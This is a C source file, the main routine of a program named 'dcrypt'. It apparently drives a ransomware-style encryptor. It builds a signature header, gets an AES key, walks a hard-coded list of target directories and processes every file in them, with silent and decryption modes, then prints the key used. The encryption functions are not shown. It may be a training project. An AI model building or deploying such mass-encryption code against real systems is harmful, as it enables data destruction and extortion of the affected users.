#include "dcrypt.h"

#ifdef _WIN32
t_windows	win_env = {0};
#endif

void print_results(t_env *env)
{
	#ifdef _WIN32
	const char	*msg = "Successfully processed %lld file(s).\n";
	# else
	const char	*msg = "Successfully processed %ld file(s).\n";
	#endif

	printf("\n=======================================\n" FMT_INFO);
	printf(msg, env->handled_file_count);

	if (env->modes & DC_REVERSE && env->decryption_key)
		printf(FMT_INFO "Used key: %s\n", env->decryption_key);
	else if (env->encryption_key)
		print_hex(FMT_INFO "Used key", env->encryption_key, DC_AES_KEY_SIZE);
}

int init_dcrypt_header(t_env *env)
{
	// Set the file signature
	memcpy(env->dcrypt_header.signature, DC_SIGNATURE, DC_MAGICNBR_SIZE);
	// Get the encryption key that will be used
	if (set_key(env) == DC_ERROR) {
		if (env->modes & DC_VERBOSE)
			perror(FMT_ERROR "Failed to get the key");
		return DC_ERROR;
	}
	return DC_SUCCESS;
}

int main(int argc, char *argv[])
{
	static t_env	env;

	// Detect first silent mode
	detect_silent_mode(&env, argc, argv);

	// Parse the arguments given through the commannd line
	parse_argv(&env, argc, argv);

	// Declare the injection target directory paths
	char *target_dir_paths[DC_TARGET_ARRAY_SIZE] = DC_TARGET_PATHS;

	// Init the header that will be placed at the top of the file
	if (init_dcrypt_header(&env)) exit_gracefully(&env, EXIT_FAILURE);
	
	// Open each target directory one by one
	for (size_t i = 0; i < DC_TARGET_ARRAY_SIZE; ++i)
		handle_dir(&env, target_dir_paths[i]);

	print_results(&env);
	exit_gracefully(&env, EXIT_SUCCESS);
}
